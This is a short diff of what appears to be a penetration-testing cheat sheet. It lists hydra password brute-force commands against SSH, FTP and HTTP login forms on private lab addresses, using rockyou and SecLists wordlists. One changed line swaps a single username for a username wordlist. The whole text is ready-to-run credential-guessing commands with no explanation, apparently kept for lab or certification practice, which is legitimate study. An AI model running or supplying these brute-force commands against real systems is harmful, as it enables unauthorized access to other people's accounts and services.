@@ -558,7 +558,7 @@ hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
 hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://192.168.50.202
 hydra -L /usr/share/seclists/Passwords/UserPassCombo-Jay.txt -P /usr/share/seclists/Passwords/UserPassCombo-Jay.txt ftp://192.168.50.202 -f
 hydra -l admin -P /usr/share/seclists/Passwords/2023-200_most_used_passwords.txt 192.168.172.61 http-get /login
-hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:usr=user&pwd=^PASS^:Login failed"
+hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:usr=user&pwd=^PASS^:Login failed"
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.172.61 -s 8081 http-post-form '/service/rapture/session:username=^USER64^&password=^PASS64^:F=403'
 
 # mdusa
